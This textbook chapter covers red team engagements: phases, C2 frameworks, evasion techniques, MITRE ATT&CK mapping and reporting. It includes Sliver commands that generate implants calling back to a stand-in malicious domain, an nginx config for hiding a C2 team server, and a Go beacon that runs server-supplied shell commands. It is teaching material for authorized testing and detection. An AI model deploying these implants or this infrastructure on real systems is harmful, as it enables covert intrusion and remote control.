# Chapter 44: Red Team Engagements — Simulating Real Adversaries

*A red team engagement is not just a penetration test. It's a full adversary simulation that tests people, processes, and technology together. The goal isn't to find vulnerabilities — it's to test if the blue team can detect and respond to a real attack.*

---

## Red Team vs Penetration Test

```
Penetration Test                    Red Team Engagement
────────────────────────────────────────────────────────
Goal: find vulnerabilities          Goal: test detection/response
Scope: defined, all systems         Scope: objective-based (get to crown jewel)
Duration: 1-4 weeks                 Duration: 4-12+ weeks
Blue team: usually knows            Blue team: usually doesn't know
Rules: find everything              Rules: realistic attack constraints
Report: all vulns                   Report: attack chain + detection gaps
```

---

## Red Team Engagement Structure

```
1. Planning
   ├── Rules of engagement (RoE)
   ├── Define objectives (crown jewels)
   ├── Out-of-scope systems
   ├── Emergency contact procedures
   └── Deconfliction process

2. Reconnaissance (passive)
   ├── OSINT: LinkedIn, GitHub, Shodan
   ├── Subdomain enumeration
   └── Technology fingerprinting

3. Initial Access
   ├── Phishing (most common)
   ├── External vulnerability exploitation
   └── Physical access

4. Establish Foothold
   ├── Deploy C2 beacon
   ├── Establish persistence
   └── Situational awareness

5. Internal Reconnaissance
   ├── AD enumeration
   ├── Network discovery
   └── Privilege mapping

6. Privilege Escalation
   ├── Local admin
   └── Domain Admin

7. Lateral Movement
   ├── PtH, PtT
   └── RDP, WinRM, SMB

8. Objective Completion
   ├── Access crown jewel
   └── Data exfiltration simulation

9. Reporting
   ├── Attack narrative
   ├── Detection gaps
   └── Recommendations
```

---

## Command and Control (C2) Frameworks

The C2 is the attacker's communication infrastructure. Beacons check in periodically to receive commands and send results.

```
Cobalt Strike        — industry standard, expensive ($3,500/year)
Sliver               — open source, Go-based, maintained by BishopFox
Mythic               — modern, pluggable architecture
Havoc                — newer, stealthy
Metasploit/Meterpreter — older, well-known (more likely to be detected)
```

### Sliver C2 (Go-based)

```bash
# Server setup
sliver-server

# Generate implant
generate --mtls 192.168.1.200 --os windows --arch amd64 --save implant.exe
generate --http https://malicious.domain.com --os linux --save implant_linux

# Start listener
mtls             # mutual TLS listener
http             # HTTP/S listener
dns              # DNS C2 (best for firewall evasion)

# After implant runs on victim:
sessions         # list active beacons
use SESSION_ID   # interact with session
```

---

## Evasion Techniques

Modern EDR is good at detecting common attack tools. Red teams must evade:

```
AV/EDR Evasion:
├── Signature evasion
│   ├── Encoding (XOR, base64 payloads)
│   ├── Obfuscation (variable renaming, junk code)
│   └── Custom packers / loaders
│
├── Behavioral evasion
│   ├── Sleep before execution (sandbox detection)
│   ├── Process injection (run inside legit process)
│   ├── API unhooking (remove EDR hooks from NTDLL)
│   └── Indirect syscalls (bypass userland hooks entirely)
│
└── Network evasion
    ├── HTTPS traffic over port 443 (looks normal)
    ├── Domain fronting (hide C2 behind CDN)
    ├── DNS C2 (queries to attacker DNS)
    └── Long sleep intervals (beacons every 4 hours)
```

---

## Infrastructure Design

Red team C2 infrastructure must survive takedowns and hide the real attacker:

```
Internet
    |
Redirector (VPS #1, disposable)   ← public-facing
    |  (all traffic proxied)
Team Server (hidden VPS)           ← actual C2
    |
Beacon on victim machine           ← checks in every N minutes
```

```bash
# nginx redirector config
# Only forward if User-Agent or path matches beacon
location / {
    if ($http_user_agent ~* "Mozilla/5.0 (Windows NT 10.0; Win64; x64)") {
        proxy_pass http://TEAM_SERVER;
    }
    return 404;
}
```

---

## MITRE ATT&CK Framework

Red teams use ATT&CK to plan and document attacks:

```
ATT&CK Tactics (high-level goals):
TA0001 Initial Access       → phishing, exploit public app
TA0002 Execution            → PowerShell, cmd, scheduled tasks
TA0003 Persistence          → registry run keys, services
TA0004 Privilege Escalation → unquoted service path, token theft
TA0005 Defense Evasion      → obfuscation, process injection
TA0006 Credential Access    → Mimikatz, LSASS dump
TA0007 Discovery            → network scan, AD enum
TA0008 Lateral Movement     → PsExec, WMI, RDP
TA0009 Collection           → file staging, keylogging
TA0010 Exfiltration         → DNS tunnel, HTTPS POST
TA0011 Command and Control  → C2 framework
TA0040 Impact               → ransomware, destruction
```

---

## Red Team Reporting

```
Executive Summary (1-2 pages)
├── Objective: test detection of financially-motivated threat actor
├── Outcome: gained access to financial database in 8 days
├── Key findings (bullet list)
└── Risk rating

Attack Narrative (main body)
├── Timeline of attack
├── Each technique used → ATT&CK technique ID
├── What was detected vs missed
└── Screenshots / evidence

Technical Findings
├── Initial access vector
├── Vulnerabilities exploited
├── Credentials compromised
└── Data accessed

Recommendations
├── Quick wins (fix in <1 week)
├── Medium term (1-3 months)
└── Strategic recommendations
```

---

## Go: C2 Beacon Simulator (Educational — Network Traffic Analysis)

```go
// For understanding what C2 traffic looks like — use only in authorized environments

package main

import (
    "bytes"
    "crypto/tls"
    "encoding/json"
    "fmt"
    "net/http"
    "os/exec"
    "time"
    "runtime"
)

type BeaconCheckin struct {
    HostID   string `json:"host_id"`
    Hostname string `json:"hostname"`
    OS       string `json:"os"`
    Uptime   int64  `json:"uptime"`
}

type Command struct {
    Type    string `json:"type"`
    Payload string `json:"payload"`
}

// Educational: shows what a beacon check-in looks like on the wire
// GoShield should detect: regular outbound HTTPS to unusual domain
func beaconCheckin(c2URL string) {
    client := &http.Client{
        Transport: &http.Transport{
            TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
        },
    }
    
    checkin := BeaconCheckin{
        HostID:   "DEMO-HOST-001",
        Hostname: "WORKSTATION-01",
        OS:       runtime.GOOS,
        Uptime:   time.Now().Unix(),
    }
    
    body, _ := json.Marshal(checkin)
    
    resp, err := client.Post(c2URL+"/checkin", "application/json", bytes.NewReader(body))
    if err != nil {
        return
    }
    defer resp.Body.Close()
    
    var cmd Command
    json.NewDecoder(resp.Body).Decode(&cmd)
    
    if cmd.Type == "exec" {
        // Execute received command
        out, _ := exec.Command("sh", "-c", cmd.Payload).Output()
        fmt.Printf("Command output: %s\n", out)
    }
}

// Detection: GoShield should flag:
// - Regular timed connections to same external IP/domain
// - Process making network connections that shouldn't
// - Connections from unusual processes (not browser/curl/known apps)
func main() {
    fmt.Println("Beacon simulation (educational) — shows what to detect")
    // Would normally: beaconCheckin("https://c2.example.com")
}
```

---

## Summary

| Phase | Techniques | MITRE Tactic |
|-------|-----------|-------------|
| Initial Access | Phishing, web exploit | TA0001 |
| Foothold | C2 beacon, persistence | TA0002, TA0003 |
| Lateral Movement | PtH, PsExec | TA0008 |
| Privilege Escalation | Kerberoasting, token impersonation | TA0004 |
| Objective | DCSync, data access | TA0006, TA0009 |

---

## Exercises

1. Set up Sliver C2 in a lab environment (two VMs) — generate a beacon and get a session
2. Map a recent APT attack to ATT&CK techniques — use the ATT&CK Navigator tool
3. Design a red team engagement plan for a hypothetical 500-person company
4. Read a real red team engagement report (many are public) — analyze their attack chain
